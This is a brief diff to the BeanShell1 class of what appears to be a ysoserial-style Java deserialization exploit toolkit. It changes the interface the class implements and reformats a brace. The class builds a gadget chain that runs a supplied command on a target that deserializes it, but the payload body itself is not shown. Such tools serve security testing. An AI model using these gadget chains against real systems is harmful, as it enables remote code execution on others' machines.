@@ -11,7 +11,7 @@ import java.util.Arrays;
 import java.util.Comparator;
 import java.util.PriorityQueue;
 
-import com.h2tg.ysogate.payloads.ObjectPayload;
+import com.h2tg.ysogate.payloads.CommandObjectPayload;
 import com.h2tg.ysogate.annotation.Authors;
 import com.h2tg.ysogate.utils.Reflections;
 import com.h2tg.ysogate.annotation.Dependencies;
@@ -23,7 +23,8 @@ import com.h2tg.ysogate.annotation.Dependencies;
 @SuppressWarnings({"rawtypes", "unchecked"})
 @Dependencies({"org.beanshell:bsh:2.0b5"})
 @Authors({Authors.PWNTESTER, Authors.CSCHNEIDER4711})
-public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQueue> {
+public class BeanShell1 extends PayloadRunner implements CommandObjectPayload<PriorityQueue>
+{
 
 	public PriorityQueue getObject(String command) throws Exception {
 		String payload =
